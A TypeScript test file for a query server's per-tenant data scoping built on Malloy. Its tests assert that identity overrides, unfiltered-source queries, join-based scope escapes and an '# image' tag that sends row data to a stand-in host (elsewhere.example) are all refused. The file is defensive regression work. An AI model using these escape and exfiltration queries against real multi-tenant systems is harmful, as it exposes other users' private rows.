// A host that scopes data by a given relies on THREE things, and core provides
// two of them. These tests pin all three against real compiles, because the
// whole feature is a security boundary and every one of them was got wrong at
// least once while it was being built.
//
//   1. core binds the host's runtime value and refuses a per-query override
//      (`config.finalizeGivens`);
//   2. core refuses to run at all when a finalized name has no value, and
//      refuses when the model stopped declaring it;
//   3. OURS: a query that never references the given is refused, so deleting
//      the `where:` cannot quietly unscope the data.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import * as malloy from '@malloydata/malloy';
import {
  runRestricted,
  scopeEscape,
  unreferencedGivens,
  unreferencedGivensMessage,
  withoutReservedGivens,
} from '../src/index';

// Importing a db-* package self-registers it on malloy's module-level registry,
// which is what a `{"is": "duckdb"}` connection in the config resolves against.
import '@malloydata/db-duckdb/native';

const BASE = 'file:///t/';
const SQL = 'duckdb.sql("SELECT \'a@b.com\' as who UNION ALL SELECT \'c@d.com\' as who")';
const DECL = ['##! experimental { givens }', 'given:', "  MALLOYYO_EMAIL :: string is ''"];

/** Scoped the way an author should write it: the filter is on the SOURCE. */
const SCOPED = DECL.concat([
  'source: mine is ' + SQL + ' extend { where: who = $MALLOYYO_EMAIL }',
  'query: rows is mine -> { select: who }',
]).join('\n');

/** The accident: declaration kept, filter deleted. */
const UNSCOPED = DECL.concat([
  'source: mine is ' + SQL,
  'query: rows is mine -> { select: who }',
]).join('\n');

/** The rogue edit: the declaration itself is gone. */
const NO_DECL = ['source: mine is ' + SQL, 'query: rows is mine -> { select: who }'].join('\n');

const REQUIRED = ['MALLOYYO_EMAIL'];

function config(finalize: boolean) {
  return new malloy.MalloyConfig(
    JSON.stringify({
      connections: { duckdb: { is: 'duckdb' } },
      ...(finalize ? { finalizeGivens: REQUIRED } : {}),
    }),
    { overlays: malloy.defaultConfigOverlays() },
  );
}

async function run(
  src: string,
  opts: { email?: string; gate?: boolean; override?: string } = {},
) {
  const cfg = config(true);
  try {
    const reader = new malloy.InMemoryURLReader(new Map([[BASE + 'm.malloy', src]]));
    const runtime = new malloy.Runtime({
      config: cfg,
      urlReader: reader,
      ...(opts.email ? { givens: { MALLOYYO_EMAIL: opts.email } } : {}),
    } as never);
    const out = await runRestricted(runtime, new URL(BASE + 'm.malloy'), 'run: rows', {
      ...(opts.gate === false ? {} : { requireGivens: REQUIRED }),
      ...(opts.override ? { givens: { MALLOYYO_EMAIL: opts.override } } : {}),
    });
    return out.ok
      ? { ok: true as const, rows: out.rows }
      : { ok: false as const, why: (out.problems ?? []).map((p) => p.message).join(' | ') };
  } finally {
    await cfg.shutdown('close');
  }
}

test('the pure gate: refused only when a query references NONE of them', () => {
  assert.deepEqual(unreferencedGivens(REQUIRED, ['MALLOYYO_EMAIL', 'REGION']), []);
  assert.deepEqual(unreferencedGivens(REQUIRED, ['REGION']), ['MALLOYYO_EMAIL']);
  assert.deepEqual(unreferencedGivens([], ['whatever']), [], 'no requirement, no gate');

  // ANY, not all: a model scoped on two axes may filter one source by the
  // address and another by the roles, and every query need only be scoped by
  // something. Requiring both everywhere would make declaring two unusable.
  const both = ['MALLOYYO_EMAIL', 'MALLOYYO_ROLES'];
  assert.deepEqual(unreferencedGivens(both, ['MALLOYYO_EMAIL']), [], 'scoped by the address alone');
  assert.deepEqual(unreferencedGivens(both, ['MALLOYYO_ROLES']), [], 'scoped by the roles alone');
  assert.deepEqual(unreferencedGivens(both, ['REGION']), both, 'scoped by neither is refused');

  assert.match(unreferencedGivensMessage(['MALLOYYO_EMAIL']), /scoped by this given/);
});

test('a scoped model returns only the asker’s rows', async () => {
  const a = await run(SCOPED, { email: 'a@b.com' });
  assert.equal(a.ok, true, a.ok ? '' : a.why);
  assert.deepEqual(a.ok ? a.rows : [], [{ who: 'a@b.com' }]);

  const c = await run(SCOPED, { email: 'c@d.com' });
  assert.deepEqual(c.ok ? c.rows : [], [{ who: 'c@d.com' }]);
});

test('a caller cannot choose who they are', async () => {
  // TWO mechanisms, and the order matters: our strip removes the reserved name
  // before the compiler ever sees it, so the run SUCCEEDS and returns the
  // runtime identity's rows. The override is not rejected, it is ignored — which
  // is the behaviour we want, because the name is stripped whether or not the
  // host finalized it, and a caller probing for one learns nothing.
  const r = await run(SCOPED, { email: 'a@b.com', override: 'c@d.com' });
  assert.equal(r.ok, true, r.ok ? '' : r.why);
  assert.deepEqual(r.ok ? r.rows : null, [{ who: 'a@b.com' }], 'the RUNTIME identity, not the override');
});

test('…and core refuses the override on its own, if one ever reached it', async () => {
  // The second mechanism, measured directly rather than through runRestricted,
  // because the strip above means nothing gets this far any more. Pinned so a
  // change in core's `finalizeGivens` contract does not pass unnoticed: if this
  // ever stops throwing, the strip is the only thing left.
  const cfg = config(true);
  try {
    const reader = new malloy.InMemoryURLReader(new Map([[BASE + 'm.malloy', SCOPED]]));
    const runtime = new malloy.Runtime({
      config: cfg,
      urlReader: reader,
      givens: { MALLOYYO_EMAIL: 'a@b.com' },
    } as never);
    const q = runtime.loadModel(new URL(BASE + 'm.malloy')).loadQuery('run: rows');
    await assert.rejects(
      () => q.getSQL({ givens: { MALLOYYO_EMAIL: 'c@d.com' } }),
      /finalized at the runtime layer/,
    );
  } finally {
    await cfg.shutdown('close');
  }
});

test('no identity supplied → refused, never the declaration default', async () => {
  // An empty `filter<string>` means NO filter, so defaulting here would return
  // every tenant's rows to the one caller we could not identify.
  const r = await run(SCOPED, {});
  assert.equal(r.ok, false);
  assert.match(r.ok ? '' : r.why, /has no resolved value/);
});

test('the declaration removed → the dataset goes dark, not open', async () => {
  // TWO independent mechanisms refuse this, and it matters that both do: the
  // gate notices the query references nothing, and core notices the runtime is
  // supplying a name the model no longer surfaces. Whichever fires first, a
  // model that drops the declaration cannot serve.
  const gated = await run(NO_DECL, { email: 'a@b.com' });
  assert.equal(gated.ok, false);
  assert.match(gated.ok ? '' : gated.why, /references it nowhere/);

  const ungated = await run(NO_DECL, { email: 'a@b.com', gate: false });
  assert.equal(ungated.ok, false, 'core refuses on its own, gate or no gate');
  assert.match(ungated.ok ? '' : ungated.why, /unknown given/);
});

test('the FILTER removed → refused by the gate, though everything else passes', async () => {
  // The declaration is still there, so core is satisfied: it binds the value
  // happily. Only the usage gate notices that nothing consumes it.
  const ungated = await run(UNSCOPED, { email: 'a@b.com', gate: false });
  assert.equal(ungated.ok, true, 'core alone is satisfied');
  assert.equal(ungated.ok && ungated.rows?.length, 2, '…and returns EVERY row');

  const gated = await run(UNSCOPED, { email: 'a@b.com' });
  assert.equal(gated.ok, false, 'the gate catches it');
  assert.match(gated.ok ? '' : gated.why, /references it nowhere/);
});

test('a source-level filter carries the reference to every query over it', async () => {
  // `rows` is `mine -> { select: who }` — it never mentions the given. The
  // `where:` on the source is what makes it referenced, which is why the gate
  // costs an author nothing when they filter in the right place.
  const r = await run(SCOPED, { email: 'a@b.com' });
  assert.equal(r.ok, true, r.ok ? '' : r.why);
});

test('a reserved given a caller SENDS is stripped, finalized or not', () => {
  // The hole this closes: `finalizeGivens` only locks the names the host put in
  // it, which is `datasets.required_givens`. A model that DECLARES
  // MALLOYYO_EMAIL on a dataset nobody ticked the box for is locked by nothing,
  // and it looks fine from outside — the declaration default '' matches no rows,
  // so every view renders empty. A caller passing the name then picks whose rows
  // they read. So the strip does not consult the requirement list at all.
  assert.deepEqual(withoutReservedGivens({ MALLOYYO_EMAIL: 'ceo@corp.com' }), {});
  assert.deepEqual(
    withoutReservedGivens({ MALLOYYO_EMAIL: 'ceo@corp.com', REGION: 'west' }),
    { REGION: 'west' },
    'an ordinary given is untouched',
  );
  assert.deepEqual(withoutReservedGivens({ MALLOYYO_ROLES: ['admin'] }), {});
  assert.deepEqual(withoutReservedGivens(undefined), undefined, 'nothing sent, nothing built');
  assert.deepEqual(withoutReservedGivens({}), {});
  // Prefix, not an allowlist: a name this server does not fill today must not be
  // settable either, or adding one later silently opens what was already sent.
  assert.deepEqual(withoutReservedGivens({ MALLOYYO_ORGANIZATION: 'acme' }), {});
  assert.deepEqual(
    withoutReservedGivens({ malloyyo_email: 'x' }),
    { malloyyo_email: 'x' },
    'case-sensitive: the reserved prefix is exactly MALLOYYO_',
  );
});

test('an UNFINALIZED reserved given cannot be set by the caller either', async () => {
  // The end-to-end version of the test above, and the one that would have caught
  // the regression: same scoped model, but the host finalizes NOTHING — the state
  // a dataset with an empty required_givens list is in. Before the strip, the
  // caller's value bound and they read another tenant's row.
  const cfg = config(false);
  try {
    const reader = new malloy.InMemoryURLReader(new Map([[BASE + 'm.malloy', SCOPED]]));
    const runtime = new malloy.Runtime({ config: cfg, urlReader: reader } as never);
    const out = await runRestricted(runtime, new URL(BASE + 'm.malloy'), 'run: rows', {
      givens: { MALLOYYO_EMAIL: 'a@b.com' },
    });
    // The value never reaches the compiler, so the declaration default '' stands
    // and matches nobody. Empty, not somebody else's rows.
    assert.equal(out.ok, true, out.ok ? '' : (out.problems ?? []).map((p) => p.message).join(' | '));
    assert.deepEqual(out.ok ? out.rows : null, [], 'the caller got nothing, not a@b.com');
  } finally {
    await cfg.shutdown('close');
  }
});

// --- text the CALLER wrote ---------------------------------------------------
//
// Everything above runs `run: rows`, a query the model defines. The gate —
// "the compiled query references the given somewhere" — is sound for that. It
// is not sound for text a caller writes, because a caller can put the reference
// there. Each query below RETURNED BOTH TENANTS' ROWS, gate on, before
// `scopeEscape` existed; they are kept as the queries, not as a description of
// them, so the next person to loosen that rule has to watch them pass.

/** One scoped source and the unfiltered one it is built on — an ordinary model. */
const TWO_SOURCES = DECL.concat([
  'source: raw is ' + SQL,
  'source: mine is raw extend { where: who = $MALLOYYO_EMAIL }',
]).join('\n');

async function ask(text: string, opts: { gate?: boolean } = {}) {
  const cfg = config(true);
  try {
    const reader = new malloy.InMemoryURLReader(new Map([[BASE + 'm.malloy', TWO_SOURCES]]));
    const runtime = new malloy.Runtime({
      config: cfg,
      urlReader: reader,
      givens: { MALLOYYO_EMAIL: 'a@b.com' },
    } as never);
    const out = await runRestricted(runtime, new URL(BASE + 'm.malloy'), text, {
      ...(opts.gate === false ? {} : { requireGivens: REQUIRED }),
    });
    return out.ok
      ? { ok: true as const, rows: out.rows }
      : { ok: false as const, codes: (out.problems ?? []).map((p) => p.code) };
  } finally {
    await cfg.shutdown('close');
  }
}

test('a caller cannot satisfy the gate by MENTIONING the given', async () => {
  // The scoped source still answers, and only with the asker's row.
  assert.deepEqual(await ask('run: mine -> { select: who }'), { ok: true, rows: [{ who: 'a@b.com' }] });
  // The unfiltered one is refused, as it always was…
  assert.deepEqual(await ask('run: raw -> { select: who }'), { ok: false, codes: ['given-not-referenced'] });
  // …and stays refused with a column, or a filter, that only names the given.
  for (const text of [
    'run: raw -> { select: who, w is $MALLOYYO_EMAIL }',
    'run: raw -> { select: who; where: $MALLOYYO_EMAIL = $MALLOYYO_EMAIL }',
    'run: raw -> { select: who; where: who != $MALLOYYO_EMAIL }',
  ]) {
    assert.deepEqual(await ask(text), { ok: false, codes: ['scope-escape'] }, text);
  }
});

test('…nor by JOINING a scoped source to an unscoped one, in either direction', async () => {
  for (const text of [
    // Rooted at the unfiltered source; the reference rides in on the join.
    'run: raw extend { join_cross: m is mine } -> { select: who, x is m.who }',
    // Rooted at the scoped one; the join reaches the rows it hides.
    'run: mine extend { join_cross: r is raw } -> { select: other is r.who }',
    // The same, as a source statement of the caller's own.
    'source: x is raw extend { join_cross: m is mine }\nrun: x -> { select: who, y is m.who }',
    'run: mine extend { JOIN_ONE: r is raw on true } -> { select: r.who }',
  ]) {
    assert.deepEqual(await ask(text), { ok: false, codes: ['scope-escape'] }, text);
  }
});

test('the rule is about scoped data: with nothing required, the same text runs', async () => {
  // A dataset that scopes by nothing has nothing to escape, and ad-hoc joins
  // are an ordinary thing to write there.
  const joined = await ask('run: raw extend { join_cross: m is mine } -> { select: who }', { gate: false });
  assert.equal(joined.ok, true);
});

test('scopeEscape: what it refuses, and that it cannot be talked out of it', () => {
  const R = ['MALLOYYO_EMAIL'];
  assert.equal(scopeEscape('run: mine -> { select: who }', R), null);
  assert.equal(scopeEscape('run: mine -> { select: who; where: region = $region }', R), null, 'ordinary givens are fine');
  assert.equal(scopeEscape('run: mine -> { select: joined_at }', R), null, 'a field name is not a join');
  assert.equal(scopeEscape('run: raw extend { join_one: m is mine }', []), null, 'nothing required, nothing refused');

  assert.match(scopeEscape('select: w is $MALLOYYO_EMAIL', R) ?? '', /may not reference/);
  assert.match(scopeEscape('select: w is $MALLOYYO_ROLES', R) ?? '', /may not reference/, 'any reserved name');
  assert.match(scopeEscape('select: w is $malloyyo_email', R) ?? '', /may not reference/, 'whatever the case');
  assert.match(scopeEscape('select: w is $ MALLOYYO_EMAIL', R) ?? '', /may not reference/, 'whatever the spacing');
  assert.match(scopeEscape('extend { join_many: r is raw }', R) ?? '', /may not define a join/);

  // No "it is only in a comment / a string": a scanner that skips comments can
  // be handed a comment marker inside a string to hide what follows it.
  assert.match(scopeEscape("select: a is '//', w is $MALLOYYO_EMAIL", R) ?? '', /may not reference/);
  assert.match(scopeEscape('// $MALLOYYO_EMAIL\nrun: mine -> { select: who }', R) ?? '', /may not reference/);
});

// A draft dashboard or a shared query is written by one member and RUN AS
// whoever opens it. On scoped data the rows are therefore the reader's — and a
// column tagged `# image` whose value is a URL built from them has the reader's
// browser deliver those rows to the author, without a click. `# link` is the
// same with one.
test('scopeEscape: the render tags that turn a value into a URL the browser loads', () => {
  const R = ['MALLOYYO_EMAIL'];
  const leak =
    "run: mine -> { select:\n  # image\n  pic is concat('https://elsewhere.example/p.png?d=', who)\n}";
  assert.match(scopeEscape(leak, R) ?? '', /"# image" or "# link"/);
  assert.match(scopeEscape('select: # link\n  u is who', R) ?? '', /"# image" or "# link"/, 'wherever on the line it starts');
  assert.match(scopeEscape('# percent IMAGE\nx is 1', R) ?? '', /"# image" or "# link"/, 'among other tags, any case');
  assert.match(scopeEscape('# "im\\u0061ge"\nx is 1', R) ?? '', /"# image" or "# link"/, 'or spelled with an escape');

  // Ordinary chart and layout tags, and the dashboard's own, are untouched.
  assert.equal(scopeEscape('# bar_chart\nrun: mine -> { group_by: who }', R), null);
  assert.equal(scopeEscape('# artifact { title="Mine" }\nquery: q is mine -> { select: who }', R), null);
  // And on data that scopes by nothing, the author can already read every row
  // a reader would: there is nothing to carry.
  assert.equal(scopeEscape(leak, []), null);
});

test('a query carrying one is refused end to end on scoped data', async () => {
  const text = "run: mine -> { select:\n  # image\n  pic is concat('https://elsewhere.example/?d=', who)\n}";
  assert.deepEqual(await ask(text), { ok: false, codes: ['scope-escape'] });
  const open = await ask(text, { gate: false });
  assert.equal(open.ok, true, 'and runs where nothing is scoped');
});
